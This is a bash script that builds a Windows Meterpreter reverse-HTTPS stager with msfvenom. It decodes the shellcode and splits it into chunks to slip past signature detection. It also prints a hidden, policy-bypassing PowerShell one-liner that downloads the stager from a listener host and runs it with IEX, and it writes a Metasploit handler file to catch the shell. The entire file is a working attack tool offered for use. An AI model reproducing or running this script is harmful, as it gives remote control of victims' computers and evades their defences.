#!/bin/bash
# shellcode replacement stuff
# meterpreter PSH-NET payload
# darksh3llRU v0.5

# payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
payload="windows/x64/meterpreter/reverse_https"
#ListenerIP=185.117.155.19
ListenerIP=192.168.88.19
ListenerPort=8443
ListenerURI="/logout"
ProxyType=HTTP
ProxyHost=""
ProxyPort=""
ProxyUser=""
ProxyPass=""
UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
#DownloadURL="https://darksh3ll.info/testtesttest"
DownloadURL="http://192.168.88.19:8080"

# payload options one liner
payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
printf "Payload and options used:\n$payload\n$payload_options\n...\n"

# generate payload
raw_payload="msfvenom -p $payload $payload_options -f psh-net -o raw_pshnet_revhttps.ps1"
printf "Generating staget with msfvenom:\n$raw_payload\n...\n"
$raw_payload

# raw payload usage
printf "Raw psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# extract base64 encoded string, decode, convert to binary format for the future update
# n00b dirty way: cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g'
printf "Extracting, decoding and converting shellcode:\n...\n"
cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g' > raw_pshnet_revhttps.base64.txt
base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\n'  > raw_pshnet_revhttps.hex.txt

printf "Original shellcode raw_pshnet_revhttps.hex.txt, modify and put into the file final_pshnet_revhttps.hex.txt\n"

# shellcode modification section
printf "There should be some input waiting stuff to proceed with converting, encoding...\n"
# n00b shellcode copy paste -> emulation for shellcode modification !!!SWITCH OFF FOR REAL!!!
cp raw_pshnet_revhttps.hex.txt final_pshnet_revhttps.hex.txt
read -p "Press any key to continue when modified shellcode file is ready..." -n1 -s

# base64 encode the shellcode and put it into ps file
printf "\nStarting converting, encoding and updating ps1 file process...\n"
xxd -p -r final_pshnet_revhttps.hex.txt | base64 | tr -d '\n' > final_pshnet_revhttps.base64.txt
# prepare to shellcode change
raw_shellcode=$(<raw_pshnet_revhttps.base64.txt)
eleet_shellcode=$(<final_pshnet_revhttps.base64.txt)
printf "Old shellcode:\n$raw_shellcode"
printf "\nNew shellcode:\n$eleet_shellcode"
# make a backup of the original file and perform sed on the new file
#cp raw_pshnet_revhttps.ps1 eleet_pshnet_revhttps.ps1
#sed -i "s,$raw_shellcode,$eleet_shellcode,g" eleet_pshnet_revhttps.ps1
#printf "\nShellcode replacement done! eleet psh-net usage example:\n"
#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# real eleet stager creations
chunk_size=200
printf "\nSplitting shellcode in chunks with size $chunksize"
cp raw_pshnet_revhttps.ps1 final_pshnet_revhttps.ps1
# determine shellcode size, split by chunk_size in the cycle and put to the array
shellcode_size=${#eleet_shellcode}
printf "DEBUG: Shellcode size is $shellcode_size\n"
shellcode_parts=$(($shellcode_size/$chunk_size))
printf "DEBUG: Shellcode splits into $shellcode_parts+1 parts\n"

y=0 
for (( i=0; i <=$shellcode_parts; i++))
do
    shellcode_chunks[$i]=$(echo ${eleet_shellcode:$y:$chunk_size})
    y=$(($y+$chunk_size))
done
printf "DEBUG: shellcode_chunks array is printed:\n"
printf "${shellcode_chunks[*]}\n"
printf "DEBUG: shellcode_chunks array is correct?\n"

# insert shellcode_chunks before call to encoded shellcode
for (( x=0; x <=$shellcode_parts; x++))
do
    sed -i "/CompileAssemblyFromSource/a \$sc$x=\"${shellcode_chunks[$x]}\"" final_pshnet_revhttps.ps1
    sed -i "/CompileAssemblyFromSource/G" final_pshnet_revhttps.ps1
    sc_concat+="\$sc$x+"
done

# last + remove trick
sc_concat=${sc_concat%?}
printf "DEBUG: changing base64 string to $sc_concat\n"

# change base64 encoded shellcode with sc_concat variable
sed -i "s,$raw_shellcode,$sc_concat,g" final_pshnet_revhttps.ps1
sed -i "s,\"$sc_concat\",$sc_concat,g" final_pshnet_revhttps.ps1

printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"



# create multu handler listener file
printf "Creating multi handler script file...\n"
printf "use exploit/multi/handler\n" > multihandler.rc
printf "set PAYLOAD $payload\n" >> multihandler.rc
printf "set LHOST $ListenerIP\n" >> multihandler.rc
printf "set LPORT $ListenerPort\n" >> multihandler.rc
printf "set LURI $ListenerURI\n" >> multihandler.rc
printf "set HttpProxyType $ProxyType\n" >> multihandler.rc
printf "set HttpProxyHost $ProxyHost\n" >> multihandler.rc
printf "set HttpProxyPort $ProxyPort\n" >> multihandler.rc
printf "set HttpProxyUser $ProxyUser\n" >> multihandler.rc
printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
printf "exploit -j -z\n" >> multihandler.rc
printf "Run listener: msfconsole -r multihandler.rc\n"
